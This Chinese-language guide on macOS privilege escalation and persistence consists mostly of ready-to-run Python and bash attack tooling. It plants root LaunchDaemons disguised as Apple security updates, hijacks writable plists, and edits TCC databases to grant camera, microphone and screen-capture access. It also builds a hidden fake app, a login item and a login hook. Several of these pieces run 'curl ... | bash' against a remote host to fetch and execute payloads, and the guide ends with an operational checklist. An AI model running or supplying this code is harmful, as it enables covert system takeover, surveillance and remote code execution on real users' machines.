# macOS权限提升与持久化

## macOS提权

### LaunchDaemons与LaunchAgents

#### LaunchDaemon枚举
```bash
#!/bin/bash
# launchdaemon_enumeration.sh

echo "[*] Enumerating LaunchDaemons and LaunchAgents..."

# 系统级LaunchDaemons
echo "[*] System LaunchDaemons:"
find /System/Library/LaunchDaemons /Library/LaunchDaemons -name "*.plist" 2>/dev/null | while read plist; do
    echo "[+] $plist"
    # 检查文件权限
    ls -la "$plist"
    # 检查是否可写
    if [ -w "$plist" ]; then
        echo "[!] WARNING: LaunchDaemon is writable: $plist"
    fi
done

# 用户级LaunchAgents
echo "[*] User LaunchAgents:"
find /System/Library/LaunchAgents /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" 2>/dev/null | while read plist; do
    echo "[+] $plist"
    # 检查文件权限
    ls -la "$plist"
    # 检查是否可写
    if [ -w "$plist" ]; then
        echo "[!] WARNING: LaunchAgent is writable: $plist"
    fi
done

# 检查正在运行的服务
echo "[*] Currently running LaunchServices:"
launchctl list | grep -v "^PID"

# 检查服务权限
echo "[*] Checking LaunchService permissions:"
launchctl print system | grep -i "permissions\|security"

# 查找可写的LaunchDaemon目录
echo "[*] Checking for writable LaunchDaemon directories:"
for dir in /Library/LaunchDaemons /System/Library/LaunchDaemons; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo "[!] Writable directory: $dir"
    fi
done

# 检查启动项
echo "[*] Checking startup items:"
find /Library/StartupItems /System/Library/StartupItems -type f 2>/dev/null | while read item; do
    echo "[+] Startup item: $item"
    ls -la "$item"
done
```

#### LaunchDaemon提权利用
```python
# launchdaemon_exploitation.py
import os
import plistlib
import subprocess
import tempfile
import shutil
from pathlib import Path

class LaunchDaemonExploiter:
    def __init__(self):
        self.system_daemons = ['/System/Library/LaunchDaemons', '/Library/LaunchDaemons']
        self.system_agents = ['/System/Library/LaunchAgents', '/Library/LaunchAgents']
        self.user_agents = [os.path.expanduser('~/Library/LaunchAgents')]
        self.vulnerable_services = []
    
    def enumerate_services(self):
        """枚举所有LaunchServices"""
        all_services = []
        
        for directory in self.system_daemons + self.system_agents + self.user_agents:
            if os.path.exists(directory):
                for plist_file in Path(directory).glob('*.plist'):
                    try:
                        with open(plist_file, 'rb') as f:
                            plist_data = plistlib.load(f)
                        
                        service_info = {
                            'path': str(plist_file),
                            'label': plist_data.get('Label', 'Unknown'),
                            'program': plist_data.get('Program', plist_data.get('ProgramArguments', ['Unknown'])[0]),
                            'run_at_load': plist_data.get('RunAtLoad', False),
                            'keep_alive': plist_data.get('KeepAlive', False),
                            'standard_out_path': plist_data.get('StandardOutPath', ''),
                            'standard_error_path': plist_data.get('StandardErrorPath', ''),
                            'user_name': plist_data.get('UserName', ''),
                            'group_name': plist_data.get('GroupName', ''),
                            'permissions': os.stat(plist_file).st_mode,
                            'writable': os.access(plist_file, os.W_OK),
                            'directory_writable': os.access(os.path.dirname(plist_file), os.W_OK)
                        }
                        
                        all_services.append(service_info)
                        
                        if service_info['writable'] or service_info['directory_writable']:
                            self.vulnerable_services.append(service_info)
                            print(f"[!] Found vulnerable service: {service_info['label']}")
                            print(f"    Path: {service_info['path']}")
                            print(f"    Writable: {service_info['writable']}")
                            print(f"    Directory writable: {service_info['directory_writable']}")
                        
                    except Exception as e:
                        print(f"[!] Error reading {plist_file}: {e}")
        
        return all_services
    
    def create_malicious_launchdaemon(self, payload_command, service_name="com.apple.security.update"):
        """创建恶意的LaunchDaemon"""
        plist_content = {
            'Label': service_name,
            'ProgramArguments': ['/bin/bash', '-c', payload_command],
            'RunAtLoad': True,
            'KeepAlive': True,
            'StandardOutPath': '/var/log/security_update.log',
            'StandardErrorPath': '/var/log/security_update_error.log',
            'UserName': 'root',
            'GroupName': 'wheel',
            'WorkingDirectory': '/tmp',
            'RootDirectory': '/',
            'Nice': -5,
            'ProcessType': 'Interactive',
            'ThrottleInterval': 60,
            'LaunchOnlyOnce': False,
            'LimitLoadToSessionType': ['System']
        }
        
        # 尝试写入系统LaunchDaemon目录
        system_daemon_dir = '/Library/LaunchDaemons'
        plist_path = os.path.join(system_daemon_dir, f"{service_name}.plist")
        
        try:
            os.makedirs(system_daemon_dir, exist_ok=True)
            
            with open(plist_path, 'wb') as f:
                plistlib.dump(plist_content, f)
            
            # 设置正确的权限
            os.chmod(plist_path, 0o644)
            os.chown(plist_path, 0, 0)  # root:wheel
            
            print(f"[+] Created malicious LaunchDaemon: {plist_path}")
            return plist_path
            
        except PermissionError:
            print(f"[!] Permission denied creating {plist_path}")
            
            # 尝试用户级LaunchAgent
            return self.create_malicious_launchagent(payload_command, service_name)
        except Exception as e:
            print(f"[!] Error creating LaunchDaemon: {e}")
            return None
    
    def create_malicious_launchagent(self, payload_command, service_name="com.apple.user.security"):
        """创建恶意的LaunchAgent"""
        user_agent_dir = os.path.expanduser('~/Library/LaunchAgents')
        plist_path = os.path.join(user_agent_dir, f"{service_name}.plist")
        
        plist_content = {
            'Label': service_name,
            'ProgramArguments': ['/bin/bash', '-c', payload_command],
            'RunAtLoad': True,
            'KeepAlive': {
                'SuccessfulExit': False,
                'Crashed': True
            },
            'StandardOutPath': os.path.expanduser('~/Library/Logs/security_update.log'),
            'StandardErrorPath': os.path.expanduser('~/Library/Logs/security_update_error.log'),
            'WorkingDirectory': os.path.expanduser('~/Library/Caches'),
            'ThrottleInterval': 300,
            'LimitLoadToSessionType': ['Aqua', 'Background', 'LoginWindow', 'StandardIO', 'System']
        }
        
        try:
            os.makedirs(user_agent_dir, exist_ok=True)
            
            with open(plist_path, 'wb') as f:
                plistlib.dump(plist_content, f)
            
            print(f"[+] Created malicious LaunchAgent: {plist_path}")
            return plist_path
            
        except Exception as e:
            print(f"[!] Error creating LaunchAgent: {e}")
            return None
    
    def load_service(self, plist_path):
        """加载LaunchService"""
        service_name = os.path.basename(plist_path).replace('.plist', '')
        
        try:
            # 加载服务
            result = subprocess.run(['launchctl', 'load', plist_path], 
                                  capture_output=True, text=True, check=True)
            
            print(f"[+] Loaded service: {service_name}")
            
            # 启动服务
            result = subprocess.run(['launchctl', 'start', service_name], 
                                  capture_output=True, text=True, check=True)
            
            print(f"[+] Started service: {service_name}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to load/start service {service_name}: {e}")
            print(f"    stdout: {e.stdout}")
            print(f"    stderr: {e.stderr}")
            return False
    
    def exploit_writable_service(self, service_info):
        """利用可写的LaunchService"""
        print(f"[*] Exploiting writable service: {service_info['label']}")
        
        try:
            # 备份原始plist
            backup_path = f"{service_info['path']}.bak"
            shutil.copy2(service_info['path'], backup_path)
            print(f"[+] Backed up original plist to {backup_path}")
            
            # 读取原始plist
            with open(service_info['path'], 'rb') as f:
                original_plist = plistlib.load(f)
            
            # 修改plist以执行恶意命令
            malicious_command = "curl -s http://192.168.1.100:8080/payload.sh | bash"
            
            if 'ProgramArguments' in original_plist:
                original_plist['ProgramArguments'] = ['/bin/bash', '-c', malicious_command]
            elif 'Program' in original_plist:
                original_plist['Program'] = '/bin/bash'
                original_plist['ProgramArguments'] = ['/bin/bash', '-c', malicious_command]
            
            # 确保服务会运行
            original_plist['RunAtLoad'] = True
            original_plist['KeepAlive'] = True
            
            # 写入修改后的plist
            with open(service_info['path'], 'wb') as f:
                plistlib.dump(original_plist, f)
            
            print(f"[+] Modified service plist: {service_info['path']}")
            
            # 重新加载服务
            self.reload_service(service_info['path'])
            
            return True
            
        except Exception as e:
            print(f"[!] Error exploiting service: {e}")
            return False
    
    def reload_service(self, plist_path):
        """重新加载LaunchService"""
        service_name = os.path.basename(plist_path).replace('.plist', '')
        
        try:
            # 先卸载（如果已加载）
            subprocess.run(['launchctl', 'unload', plist_path], 
                          capture_output=True, check=False)
            
            # 重新加载
            subprocess.run(['launchctl', 'load', plist_path], 
                          capture_output=True, check=True)
            
            print(f"[+] Reloaded service: {service_name}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to reload service {service_name}: {e}")
            return False
    
    def create_startup_item(self, payload_command, item_name="SecurityUpdate"):
        """创建启动项（旧版macOS）"""
        startup_items_dir = '/Library/StartupItems'
        item_dir = os.path.join(startup_items_dir, item_name)
        
        try:
            os.makedirs(item_dir, exist_ok=True)
            
            # 创建启动脚本
            startup_script = f"""#!/bin/sh
# {item_name} Startup Item

. /etc/rc.common

StartService() {{
    {payload_command}
}}

StopService() {{
    return 0
}}

RestartService() {{
    StartService
}}

RunService "$1"
"""
            
            script_path = os.path.join(item_dir, item_name)
            with open(script_path, 'w') as f:
                f.write(startup_script)
            
            os.chmod(script_path, 0o755)
            
            # 创建属性列表
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
    <string>{item_name}</string>
    <key>Messages</key>
    <dict>
        <key>start</key>
        <string>Starting {item_name}</string>
        <key>stop</key>
        <string>Stopping {item_name}</string>
    </dict>
    <key>Provides</key>
    <array>
        <string>{item_name}</string>
    </array>
    <key>Requires</key>
    <array>
        <string>Network</string>
    </array>
    <key>OrderPreference</key>
    <string>None</string>
</dict>
</plist>"""
            
            plist_path = os.path.join(item_dir, 'StartupParameters.plist')
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            print(f"[+] Created startup item: {item_dir}")
            return item_dir
            
        except Exception as e:
            print(f"[!] Error creating startup item: {e}")
            return None
    
    def auto_exploit(self):
        """自动检测和利用LaunchServices"""
        print("[*] Starting automatic LaunchService exploitation...")
        
        # 枚举所有服务
        all_services = self.enumerate_services()
        print(f"[+] Found {len(all_services)} LaunchServices")
        
        if not self.vulnerable_services:
            print("[!] No vulnerable services found")
            
            # 尝试创建新的恶意服务
            print("[*] Creating new malicious LaunchDaemon...")
            malicious_service = self.create_malicious_launchdaemon(
                "curl -s http://192.168.1.100:8080/payload.sh | bash"
            )
            
            if malicious_service:
                self.load_service(malicious_service)
                return True
            else:
                print("[!] Failed to create malicious LaunchDaemon")
                return False
        
        # 利用可写的服务
        for service in self.vulnerable_services:
            print(f"\n[*] Attempting to exploit {service['label']}...")
            
            if self.exploit_writable_service(service):
                print(f"[+] Successfully exploited {service['label']}")
                return True
        
        return False

# 使用示例
exploiter = LaunchDaemonExploiter()
exploiter.auto_exploit()
```

### TCC绕过

#### TCC数据库操作
```python
# tcc_bypass.py
import sqlite3
import os
import subprocess
import tempfile
from pathlib import Path

class TCCBypass:
    def __init__(self):
        self.tcc_db_paths = [
            '/Library/Application Support/com.apple.TCC/TCC.db',  # 系统级
            os.path.expanduser('~/Library/Application Support/com.apple.TCC/TCC.db')  # 用户级
        ]
        self.backup_paths = []
    
    def check_tcc_databases(self):
        """检查TCC数据库访问权限"""
        accessible_dbs = []
        
        for db_path in self.tcc_db_paths:
            if os.path.exists(db_path):
                # 检查读权限
                if os.access(db_path, os.R_OK):
                    accessible_dbs.append({
                        'path': db_path,
                        'readable': True,
                        'writable': os.access(db_path, os.W_OK),
                        'size': os.path.getsize(db_path)
                    })
                    print(f"[+] Accessible TCC database: {db_path}")
                else:
                    print(f"[!] Cannot read TCC database: {db_path}")
            else:
                print(f"[!] TCC database not found: {db_path}")
        
        return accessible_dbs
    
    def read_tcc_database(self, db_path):
        """读取TCC数据库内容"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # 获取所有表
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            
            tcc_data = {}
            for table in tables:
                table_name = table[0]
                cursor.execute(f"SELECT * FROM {table_name}")
                rows = cursor.fetchall()
                
                # 获取列名
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = [col[1] for col in cursor.fetchall()]
                
                tcc_data[table_name] = {
                    'columns': columns,
                    'rows': rows
                }
            
            conn.close()
            return tcc_data
            
        except sqlite3.Error as e:
            print(f"[!] SQLite error reading {db_path}: {e}")
            return None
        except Exception as e:
            print(f"[!] Error reading TCC database {db_path}: {e}")
            return None
    
    def add_tcc_permission(self, db_path, service, bundle_id="com.apple.Terminal", 
                          auth_value=1, auth_reason="RedTeam"):
        """添加TCC权限"""
        try:
            # 备份原始数据库
            backup_path = f"{db_path}.bak"
            shutil.copy2(db_path, backup_path)
            self.backup_paths.append(backup_path)
            print(f"[+] Backed up TCC database to {backup_path}")
            
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # 检查access表结构
            cursor.execute("PRAGMA table_info(access)")
            columns = [col[1] for col in cursor.fetchall()]
            
            # 构建插入查询
            if 'indirect_object_identifier' in columns:
                # macOS 11+ 表结构
                query = """INSERT INTO access (service, client, client_type, auth_value, 
                          auth_reason, auth_version, csreq, policy_id, 
                          indirect_object_identifier, indirect_object_identifier_type) 
                          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
                
                cursor.execute(query, (
                    service, bundle_id, 0, auth_value, auth_reason, 1, 
                    '', 0, '', 0
                ))
            else:
                # 旧版本表结构
                query = """INSERT INTO access (service, client, client_type, 
                          auth_value, auth_reason, auth_version, csreq) 
                          VALUES (?, ?, ?, ?, ?, ?, ?)"""
                
                cursor.execute(query, (
                    service, bundle_id, 0, auth_value, auth_reason, 1, ''
                ))
            
            conn.commit()
            conn.close()
            
            print(f"[+] Added TCC permission for {service} to {bundle_id}")
            return True
            
        except sqlite3.Error as e:
            print(f"[!] SQLite error modifying {db_path}: {e}")
            return False
        except Exception as e:
            print(f"[!] Error modifying TCC database {db_path}: {e}")
            return False
    
    def bypass_tcc_with_sqlite(self, target_service="kTCCServiceAccessibility"):
        """使用SQLite直接修改TCC数据库"""
        accessible_dbs = self.check_tcc_databases()
        
        if not accessible_dbs:
            print("[!] No accessible TCC databases found")
            return False
        
        for db_info in accessible_dbs:
            if db_info['writable']:
                print(f"[*] Modifying writable TCC database: {db_info['path']}")
                
                # 添加目标服务的权限
                if self.add_tcc_permission(db_info['path'], target_service):
                    print(f"[+] Successfully bypassed TCC for {target_service}")
                    return True
            else:
                print(f"[*] Reading TCC database: {db_info['path']}")
                tcc_data = self.read_tcc_database(db_info['path'])
                if tcc_data:
                    print(f"[+] Read {len(tcc_data)} tables from TCC database")
                    # 这里可以分析现有的权限
        
        return False
    
    def bypass_tcc_with_sip(self):
        """尝试绕过SIP（系统完整性保护）"""
        print("[*] Attempting to bypass SIP...")
        
        # 检查SIP状态
        try:
            result = subprocess.run(['csrutil', 'status'], capture_output=True, text=True, timeout=5)
            if 'enabled' in result.stdout.lower():
                print("[!] SIP is enabled, cannot modify system TCC database")
                return False
            else:
                print("[+] SIP is disabled")
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("[!] Cannot determine SIP status")
            return False
    
    def bypass_tcc_with_tccutil(self):
        """使用tccutil命令绕过TCC"""
        print("[*] Attempting to use tccutil...")
        
        # 尝试重置TCC数据库
        try:
            # 重置所有Accessibility权限
            result = subprocess.run(['tccutil', 'reset', 'Accessibility'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print("[+] Reset Accessibility permissions with tccutil")
                
                # 现在可以尝试添加我们自己的权限
                return True
            else:
                print(f"[!] tccutil failed: {result.stderr}")
                return False
                
        except (subprocess.TimeoutExpired, FileNotFoundError):
            print("[!] tccutil not available")
            return False
    
    def bypass_tcc_with_injection(self):
        """通过代码注入绕过TCC"""
        print("[*] Attempting TCC bypass via code injection...")
        
        # 创建恶意的dylib用于注入
        dylib_content = """
#import <Foundation/Foundation.h>
#import <Security/Security.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
{
    @autoreleasepool {
        // 尝试修改TCC设置
        NSString *service = @"kTCCServiceAccessibility";
        NSString *bundle_id = @"com.apple.Terminal";
        
        // 使用私有API（需要逆向）
        // 这里只是一个示例框架
        NSLog(@"[+] TCC bypass dylib injected");
        
        // 实际实现需要逆向TCC框架
        // 使用私有函数如 TCCAccessSetForService
    }
}
"""
        
        # 写入dylib源代码
        with tempfile.NamedTemporaryFile(mode='w', suffix='.m', delete=False) as f:
            f.write(dylib_content)
            dylib_source = f.name
        
        # 编译dylib
        dylib_path = '/tmp/tcc_bypass.dylib'
        try:
            result = subprocess.run([
                'gcc', '-dynamiclib', '-o', dylib_path, dylib_source,
                '-framework', 'Foundation', '-framework', 'Security'
            ], capture_output=True, text=True, check=True)
            
            print(f"[+] Created injection dylib: {dylib_path}")
            
            # 这里需要找到可注入的目标进程
            # 例如: DYLD_INSERT_LIBRARIES=/tmp/tcc_bypass.dylib /Applications/SomeApp.app/Contents/MacOS/SomeApp
            
            return dylib_path
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to compile dylib: {e}")
            return None
        finally:
            os.unlink(dylib_source)
    
    def auto_bypass_tcc(self):
        """自动尝试多种TCC绕过方法"""
        print("[*] Starting automatic TCC bypass...")
        
        # 1. 首先检查数据库访问权限
        accessible_dbs = self.check_tcc_databases()
        if not accessible_dbs:
            print("[!] No accessible TCC databases found")
            return False
        
        # 2. 尝试直接修改数据库
        for db_info in accessible_dbs:
            if db_info['writable']:
                print(f"[*] Attempting direct database modification...")
                
                # 尝试添加各种权限
                services_to_bypass = [
                    "kTCCServiceAccessibility",
                    "kTCCServiceScreenCapture",
                    "kTCCServiceMicrophone",
                    "kTCCServiceCamera",
                    "kTCCServiceSystemEvents",
                    "kTCCServiceAppleEvents"
                ]
                
                for service in services_to_bypass:
                    if self.add_tcc_permission(db_info['path'], service):
                        print(f"[+] Successfully bypassed TCC for {service}")
                        return True
        
        # 3. 尝试使用tccutil
        if self.bypass_tcc_with_tccutil():
            return True
        
        # 4. 尝试代码注入
        dylib_path = self.bypass_tcc_with_injection()
        if dylib_path:
            print(f"[+] Created injection dylib: {dylib_path}")
            print(f"[*] Use: DYLD_INSERT_LIBRARIES={dylib_path} target_application")
            return True
        
        print("[!] All TCC bypass methods failed")
        return False

# 使用示例
tcc_bypass = TCCBypass()
tcc_bypass.auto_bypass_tcc()
```

---

## macOS持久化

### Login Items

#### 登录项持久化
```python
# login_items_persistence.py
import os
import subprocess
import tempfile
from pathlib import Path

class LoginItemsPersistence:
    def __init__(self):
        self.login_items_file = os.path.expanduser("~/Library/Preferences/com.apple.loginitems.plist")
        self.persistent_apps = []
    
    def get_login_items(self):
        """获取当前登录项"""
        try:
            result = subprocess.run(['osascript', '-e', 'tell application "System Events" to get the name of every login item'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                login_items = result.stdout.strip().split(', ')
                return [item.strip() for item in login_items if item.strip()]
            else:
                print(f"[!] Error getting login items: {result.stderr}")
                return []
                
        except subprocess.TimeoutExpired:
            print("[!] Timeout getting login items")
            return []
        except FileNotFoundError:
            print("[!] osascript not found")
            return []
    
    def add_login_item(self, app_path, name=None, hidden=False):
        """添加登录项"""
        if not name:
            name = os.path.basename(app_path).replace('.app', '')
        
        try:
            # 使用osascript添加登录项
            script = f'''
            tell application "System Events"
                make login item at end with properties {{name: "{name}", path: "{app_path}", hidden: {str(hidden).lower()}}}
            end tell
            '''
            
            result = subprocess.run(['osascript', '-e', script], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[+] Added login item: {name}")
                self.persistent_apps.append(app_path)
                return True
            else:
                print(f"[!] Failed to add login item: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            print("[!] Timeout adding login item")
            return False
        except Exception as e:
            print(f"[!] Error adding login item: {e}")
            return False
    
    def create_malicious_app(self, payload_command, app_name="SecurityUpdate"):
        """创建恶意的应用程序"""
        # 创建应用程序包结构
        app_path = f"/tmp/{app_name}.app"
        contents_path = os.path.join(app_path, "Contents")
        macos_path = os.path.join(contents_path, "MacOS")
        resources_path = os.path.join(contents_path, "Resources")
        
        try:
            # 创建目录结构
            os.makedirs(macos_path, exist_ok=True)
            os.makedirs(resources_path, exist_ok=True)
            
            # 创建Info.plist
            info_plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>{app_name}</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.security.{app_name.lower()}</string>
    <key>CFBundleName</key>
    <string>{app_name}</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSHighResolutionCapable</key>
    <true/>
</dict>
</plist>"""
            
            with open(os.path.join(contents_path, "Info.plist"), 'w') as f:
                f.write(info_plist)
            
            # 创建可执行文件
            executable_content = f"""#!/bin/bash
# {app_name} - Security Update

# 隐藏运行
{{ 
    {payload_command}
}} &

# 立即退出，不显示UI
exit 0
"""
            
            executable_path = os.path.join(macos_path, app_name)
            with open(executable_path, 'w') as f:
                f.write(executable_content)
            
            os.chmod(executable_path, 0o755)
            
            # 创建图标（可选）
            # 这里可以复制系统图标
            
            print(f"[+] Created malicious application: {app_path}")
            return app_path
            
        except Exception as e:
            print(f"[!] Error creating malicious app: {e}")
            return None
    
    def modify_login_items_plist(self, app_path, name=None):
        """直接修改登录项plist文件"""
        if not name:
            name = os.path.basename(app_path).replace('.app', '')
        
        try:
            # 读取现有的login items plist
            if os.path.exists(self.login_items_file):
                with open(self.login_items_file, 'rb') as f:
                    login_items = plistlib.load(f)
            else:
                login_items = {'SessionItems': []}
            
            # 添加新的登录项
            new_item = {
                'Name': name,
                'Path': app_path,
                'Hide': False
            }
            
            if 'SessionItems' not in login_items:
                login_items['SessionItems'] = []
            
            login_items['SessionItems'].append(new_item)
            
            # 写回plist文件
            with open(self.login_items_file, 'wb') as f:
                plistlib.dump(login_items, f)
            
            print(f"[+] Modified login items plist: {self.login_items_file}")
            return True
            
        except Exception as e:
            print(f"[!] Error modifying login items plist: {e}")
            return False
    
    def create_login_hook(self, payload_command):
        """创建登录钩子"""
        # macOS登录钩子路径
        login_hook_path = "/Library/Scripts/login-hook.sh"
        
        hook_content = f"""#!/bin/bash
# Login hook - Security Update

# 执行恶意负载
{{
    {payload_command}
}} &

exit 0
"""
        
        try:
            # 创建钩子脚本
            with open(login_hook_path, 'w') as f:
                f.write(hook_content)
            
            os.chmod(login_hook_path, 0o755)
            
            # 设置登录钩子
            result = subprocess.run(['defaults', 'write', 'com.apple.loginwindow', 'LoginHook', login_hook_path], 
                                  capture_output=True, text=True, check=True)
            
            print(f"[+] Created login hook: {login_hook_path}")
            return True
            
        except (subprocess.CalledProcessError, PermissionError) as e:
            print(f"[!] Failed to create login hook: {e}")
            return False
    
    def setup_comprehensive_login_persistence(self):
        """设置全面的登录持久化"""
        print("[*] Setting up comprehensive login persistence...")
        
        # 1. 获取当前登录项
        current_items = self.get_login_items()
        print(f"[*] Current login items: {current_items}")
        
        # 2. 创建恶意的应用程序
        malicious_app = self.create_malicious_app(
            "curl -s http://192.168.1.100:8080/login_payload.sh | bash",
            "SecurityUpdate"
        )
        
        if malicious_app:
            # 3. 添加为登录项
            self.add_login_item(malicious_app, "SecurityUpdate", hidden=True)
            
            # 4. 直接修改plist文件（备选方案）
            self.modify_login_items_plist(malicious_app)
            
            # 5. 创建登录钩子
            self.create_login_hook(
                "curl -s http://192.168.1.100:8080/hook_payload.sh | bash"
            )
            
            print("[+] Login persistence setup complete")
            print(f"[+] Malicious app: {malicious_app}")
            return True
        else:
            print("[!] Failed to create malicious application")
            return False

# 使用示例
login_persistence = LoginItemsPersistence()
login_persistence.setup_comprehensive_login_persistence()
```

---

## 实战检查清单

### macOS提权
- [ ] LaunchDaemons已枚举
- [ ] LaunchAgents已枚举
- [ ] 可写服务已识别
- [ ] TCC数据库已检查
- [ ] 提权漏洞已利用

### LaunchServices持久化
- [ ] 恶意LaunchDaemon已创建
- [ ] 恶意LaunchAgent已创建
- [ ] 服务已加载和启动
- [ ] 启动项已创建

### 登录持久化
- [ ] 登录项已添加
- [ ] 恶意应用程序已创建
- [ ] 登录钩子已设置
- [ ] 登录项plist已修改